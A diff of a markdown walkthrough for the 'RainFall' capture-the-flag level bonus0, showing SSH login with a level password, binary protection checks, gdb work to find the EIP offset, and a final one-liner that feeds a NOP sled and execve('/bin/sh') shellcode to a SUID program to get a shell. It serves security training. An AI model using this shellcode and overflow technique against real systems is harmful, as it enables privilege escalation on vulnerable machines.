@@ -1,8 +1,17 @@
 Login as `bonus0`.
 ```shell
-┌──$ [~/42/2021/rainfall/level9]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.0.39 -p 4242 -l bonus0
 bonus0@192.168.0.39's password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
 ```
 A `SUID` executable is located in the home directory.
 ```shell
@@ -31,7 +40,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
 
-Program received signal SIGSEGV, Segmentation fault.
+Program received signal `SIGSEGV`, Segmentation fault.
 0x42424242 in ?? ()
 ```
 Seems that EIP was overwritten with `BBBB`. Use pattern as second string to find offset.
@@ -50,10 +59,10 @@ Breakpoint 1, 0x080485cb in main ()
 (gdb) continue
 Continuing.
 
-Program received signal SIGSEGV, Segmentation fault.
+Program received signal `SIGSEGV`, Segmentation fault.
 0x41336141 in ?? ()
 ```
-Decode bytes to find out which part of second string shoud be replaced with an address.
+Decode bytes to find out which part of second string should be replaced with an address.
 ```python
 >>> "41336141".decode('hex')
 'A3aA'
@@ -108,7 +117,9 @@ Breakpoint 2, 0x080485cb in main ()
 (gdb) x/1wx 0xbfffe689
 0xbfffe689:	0x41336141
 ```
-So, as it read at most 4096 bytes from stdin, a shell code can be placed as first string preceded by `NOP`.
+So, as it read at most 4096 bytes from `stdin`, a shell code can be placed as first string preceded by `NOP`.
+
+Exploit and log on to the next level.
 ```shell
 bonus0@RainFall:~$ (python -c "print('\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"; python -c "import struct; print('Aa0Aa1Aa2' + struct.pack('I', 0xbfffe6c0) + 'a4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3')"; cat -) | /home/user/bonus0/bonus0
  -
